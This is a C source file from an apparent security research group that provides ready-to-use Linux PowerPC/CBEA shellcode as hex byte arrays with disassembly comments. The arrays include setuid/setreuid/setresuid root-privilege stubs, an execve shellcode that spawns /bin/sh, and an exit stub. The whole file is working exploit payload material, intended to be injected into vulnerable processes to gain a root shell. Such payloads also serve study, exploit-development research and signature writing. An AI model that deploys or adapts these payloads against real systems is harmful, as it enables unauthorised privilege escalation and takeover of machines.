/*
 *  $Id: lin-power-shellcode.c 40 2008-11-17 02:45:30Z ramon $
 *
 *  lin-power-shellcode.c - Linux Power/CBEA shellcode
 *  Copyright 2008 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

char setresuidcode[]=       /*  24 bytes                          */
    "\x3b\xe0\x01\xff"      /*  li      r31,511                   */
    "\x7c\xa5\x2a\x78"      /*  xor     r5,r5,r5                  */
    "\x7c\x84\x22\x78"      /*  xor     r4,r4,r4                  */
    "\x7c\x63\x1a\x78"      /*  xor     r3,r3,r3                  */
    "\x38\x1f\xfe\xa5"      /*  addi    r0,r31,-347               */
    "\x44\xff\xff\x02"      /*  sc                                */
;

char setreuidcode[]=        /*  20 bytes                          */
    "\x3b\xe0\x01\xff"      /*  li      r31,511                   */
    "\x7c\x84\x22\x78"      /*  xor     r4,r4,r4                  */
    "\x7c\x63\x1a\x78"      /*  xor     r3,r3,r3                  */
    "\x38\x1f\xfe\x47"      /*  addi    r0,r31,-441               */
    "\x44\xff\xff\x02"      /*  sc                                */
;

char setuidcode[]=          /*  16 bytes                          */
    "\x3b\xe0\x01\xff"      /*  li      r31,511                   */
    "\x7c\x63\x1a\x78"      /*  xor     r3,r3,r3                  */
    "\x38\x1f\xfe\x18"      /*  addi    r0,r31,-488               */
    "\x44\xff\xff\x02"      /*  sc                                */
;

char shellcode[]=           /*  55 bytes                          */
    "\x3b\xe0\x01\xff"      /*  li      r31,511                   */
    "\x7c\xa5\x2a\x79"      /*  xor.    r5,r5,r5                  */
    "\x40\x82\xff\xf9"      /*  bnel+   <shellcode>               */
    "\x7f\xc8\x02\xa6"      /*  mflr    r30                       */
    "\x3b\xde\x01\xff"      /*  addi    r30,r30,511               */
    "\x38\x7e\xfe\x25"      /*  addi    r3,r30,-475               */
    "\x98\xbe\xfe\x2c"      /*  stb     r5,-468(r30)              */
    "\x94\xa1\xff\xfc"      /*  stwu    r5,-4(r1)                 */
    "\x94\x61\xff\xfc"      /*  stwu    r3,-4(r1)                 */
    "\x7c\x24\x0b\x78"      /*  mr      r4,r1                     */
    "\x38\x1f\xfe\x0c"      /*  addi    r0,r31,-500               */
    "\x44\xff\xff\x02"      /*  sc                                */
    "/bin/sh"
;

char exitcode[]=            /*  16 bytes                          */
    "\x3b\xe0\x01\xff"      /*  li      r31,511                   */
    "\x7c\x63\x1a\x78"      /*  xor     r3,r3,r3                  */
    "\x38\x1f\xfe\x02"      /*  addi    r0,r31,-510               */
    "\x44\xff\xff\x02"      /*  sc                                */
;

